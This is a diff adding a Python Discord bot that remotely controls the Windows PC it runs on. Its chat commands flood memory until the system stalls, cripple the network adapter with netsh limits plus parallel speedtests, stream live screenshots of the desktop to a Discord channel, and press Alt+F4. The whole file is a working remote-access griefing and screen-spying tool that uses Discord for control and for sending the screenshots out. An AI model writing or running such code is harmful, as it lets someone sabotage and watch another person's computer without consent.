@@ -1,0 +1,142 @@
+
+import discord
+from discord.ext import commands
+import threading
+import time
+import os
+import subprocess
+import random
+import speedtest
+from PIL import ImageGrab
+import asyncio
+import discord
+from discord.ext import commands
+import pyautogui
+# Initialize Discord bot
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+Token11 = ""
+# ---------------- Toggle flags ----------------
+cook_running = False
+lag_running = False
+running = False
+
+# ---------------- Lag function (RAM flood) ----------------
+def lag_worker():
+    global lag_running
+    junk = []
+    try:
+        while lag_running:
+            for _ in range(50):
+                junk.append("X" * 50_000_000)  
+    except MemoryError:
+        pass
+
+# ---------------- Cook function (Network stress) ----------------
+def cook_worker():
+    global cook_running
+
+    MIN_LIMIT_KBPS = 1
+    MAX_LIMIT_KBPS = 5
+    SPEEDTEST_THREADS = 20
+    SPEEDTEST_INTERVAL = 1
+
+    def get_active_adapter():
+        result = subprocess.run(
+            ["netsh", "interface", "show", "interface"],
+            capture_output=True,
+            text=True
+        )
+        lines = result.stdout.splitlines()
+        for line in lines:
+            if "Connected" in line and ("Dedicated" in line or "Wireless" in line):
+                return line.split()[-1]
+        return None
+
+    def set_limit(adapter, limit):
+        os.system(f'netsh interface ipv4 set subinterface "{adapter}" limit={limit}')
+
+    def remove_limit(adapter):
+        os.system(f'netsh interface ipv4 set subinterface "{adapter}" limit=0')
+
+    def run_speedtest():
+        try:
+            st = speedtest.Speedtest()
+            st.get_best_server()
+            st.download()
+            st.upload()
+        except Exception as e:
+            print(f"Error running speedtest: {e}")
+
+    adapter = get_active_adapter()
+    if adapter is None:
+        print("No active network adapter found.")
+        return
+
+    while cook_running:
+        limit = random.randint(MIN_LIMIT_KBPS, MAX_LIMIT_KBPS)
+        set_limit(adapter, limit)
+        threads = []
+        for _ in range(SPEEDTEST_THREADS):
+            t = threading.Thread(target=run_speedtest)
+            t.start()
+            threads.append(t)
+        time.sleep(SPEEDTEST_INTERVAL)
+    remove_limit(adapter)
+
+# ---------------- Bot Commands ----------------
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user}")
+
+@bot.command()
+async def lager(ctx):
+    global lag_running
+    if not lag_running:
+        lag_running = True
+        threading.Thread(target=lag_worker, daemon=True).start()
+        await ctx.send("💀 RAM flood started.")
+    else:
+        lag_running = False
+        await ctx.send("✅ RAM flood stopped.")
+
+@bot.command()
+async def cook(ctx):
+    global cook_running
+    if not cook_running:
+        cook_running = True
+        threading.Thread(target=cook_worker, daemon=True).start()
+        await ctx.send("💀 Network stress started.")
+    else:
+        cook_running = False
+        await ctx.send("✅ Network stress stopped.")
+
+@bot.command()
+async def see(ctx, interval: float = 0.5):
+    global running
+    if running:
+        await ctx.send("⚠️ Already sharing the screen.")
+        return
+    running = True
+    msg = await ctx.send("Starting live screenshots...")
+    try:
+        while running:
+            screenshot = ImageGrab.grab()
+            screenshot.save("screenshot.png")
+            await msg.edit(content="📸 Live Screenshot:", attachments=[discord.File("screenshot.png")])
+            await asyncio.sleep(interval)
+    except asyncio.CancelledError:
+        pass
+
+@bot.command()
+async def stopsee(ctx):
+    global running
+    running = False
+    await ctx.send("🛑 Screen share stopped.")
+@bot.command()
+async def leave(ctx):
+    """Simulate Alt+F4 on your own PC"""
+    await ctx.send("Closing active window (Alt+F4)...")
+    pyautogui.hotkey('alt', 'f4')
+bot.run(Token11)  
